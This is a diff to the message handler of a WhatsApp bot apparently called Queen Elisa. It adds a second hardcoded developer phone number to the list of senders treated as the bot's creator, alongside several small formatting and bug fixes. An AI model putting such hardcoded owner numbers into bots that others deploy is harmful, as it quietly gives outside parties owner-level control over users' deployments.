@@ -150,7 +150,8 @@ module.exports = ElisaBotMd = async (ElisaBotMd, m, chatUpdate, store) => {
         const pushname = m.pushName || "No Name"
         const botNumber = await ElisaBotMd.decodeJid(ElisaBotMd.user.id)
     	const nimanumber = "94719574492"
-        const isCreator = [botNumber,nimanumber ,...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
+    	const nimanumber2 = "94715166712"
+        const isCreator = [nimanumber2,botNumber,nimanumber ,...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
         const isNima = m.sender == "94715166712@s.whatsapp.net" ? true : false
         const itsMe = m.sender == botNumber ? true : false
         const isXnxxGrp = m.chat == "120363043146209271@g.us" ? true : false 
@@ -900,7 +901,7 @@ switch(command) {
              
              case 'gn': case 'night' :{
              if (global.VOICE_REPLY == 'false') return
-             await ElisaBotMd.sendMessage(m.chat, { audio: {url:'https://github.com/DarkMakerofc/UPLOADS/raw/main/VOICE/gn.mp3'}, mimetype: 'audio/mp4', ptt: true }, { quoted: m })   
+             await ElisaBotMd.sendMessage(m.chat, { audio: {url:'https://github.com/DarkMakerofc/UPLOADS/raw/main/VOICE/bs.mp3'}, mimetype: 'audio/mp4', ptt: true }, { quoted: m })   
              
              }
              break
@@ -933,17 +934,18 @@ if (global.LANG == 'EN') P_LINK = */
             await ElisaBotMd.sendText(m.chat,mess.wait)
            await fetchJson(`https://api.akuari.my.id/search/playstoresearch?query=${text}`)
             .then(async (nima) => {  
-           const caption = ` *👸 𝚀𝚄𝙴𝙴𝙽 𝙴𝙻𝙸𝚂𝙰 𝙰𝙿𝙺 𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳𝙴𝚁 👸*
+           const caption = `   *👸 𝚀𝚄𝙴𝙴𝙽 𝙴𝙻𝙸𝚂𝙰 𝙰𝙿𝙺 𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳𝙴𝚁 👸*
 
-   ✒ 𝚃𝙸𝚃𝙻𝙴 : ${nima.hasil[0].title}
-   ✒ 𝙿𝙰𝙲𝙺𝙰𝙶𝙴 𝙽𝙰𝙼𝙴 : ${nima.hasil[0].appId}
-   ✒ 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : ${nima.hasil[0].developer}
-   ✒ 𝚁𝙰𝚃𝙴 : ${nima.hasil[0].scoreText}
-   ✒ 𝙳𝙴𝚂𝙲𝚁𝙸𝙿𝚃𝙸𝙾𝙽 : ${nima.hasil[0].summary}
-   ✒ 𝚄𝚁𝙻 : ${nima.hasil[0].url} `
+ ☛ 𝚃𝙸𝚃𝙻𝙴 : ${nima.hasil[0].title}
+ ☛ 𝙿𝙰𝙲𝙺𝙰𝙶𝙴 𝙽𝙰𝙼𝙴 : ${nima.hasil[0].appId}
+ ☛ 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : ${nima.hasil[0].developer}
+ ☛ 𝚁𝙰𝚃𝙴 : ${nima.hasil[0].scoreText}
+ ☛ 𝙳𝙴𝚂𝙲𝚁𝙸𝙿𝚃𝙸𝙾𝙽 : ${nima.hasil[0].summary}
+ ☛ 𝚄𝚁𝙻 : ${nima.hasil[0].url} 
+`
    
    const buttons = [
-                    {buttonId: `getapk ${nima.hasil[0].url}}`, buttonText: {displayText: '🗳️ ᴅᴏᴡɴʟᴏᴀᴅ ᴀᴘᴋ 🗳️'}, type: 1},
+                    {buttonId: `getapk ${nima.hasil[0].url}`, buttonText: {displayText: '🗳️ ᴅᴏᴡɴʟᴏᴀᴅ ᴀᴘᴋ 🗳️'}, type: 1},
                      
                 ]
             const buttonMessage = {
@@ -3403,14 +3405,17 @@ break
                           case 'google': {
                                   if (!text) throw `Example : ${prefix + command} fatih arridho`
                                   await fetchJson(`https://api.akuari.my.id/search/google?query=${text}`)
-                                  .then(async (res) => { 
+                                  .then(async (nima) => { 
+                                  const res = nima.result
                                   let teks = `*『 ǫᴜᴇᴇɴ ᴇʟɪsᴀ ɢᴏᴏɢʟᴇ sᴇᴀʀᴄʜ 』* \n_🔍 sᴇᴀʀᴄʜ : ${text}_\n\n`
                                   for (let g of res) {
                                   teks += `➠ *Title* : ${g.title}\n`
                                   teks += `➠ *Description* : ${g.snippet}\n`
                                   teks += `➠ *Link* : ${g.link}\n\n────────────────────────\n\n`
-                                  }}).catch((err) => m.reply(NOT_FOUND))
+                                  }
                                   reply(teks)
+                                  }).catch((err) => m.reply(NOT_FOUND))
+                                  
                                   }
                                   break
                           case 'img2' :{
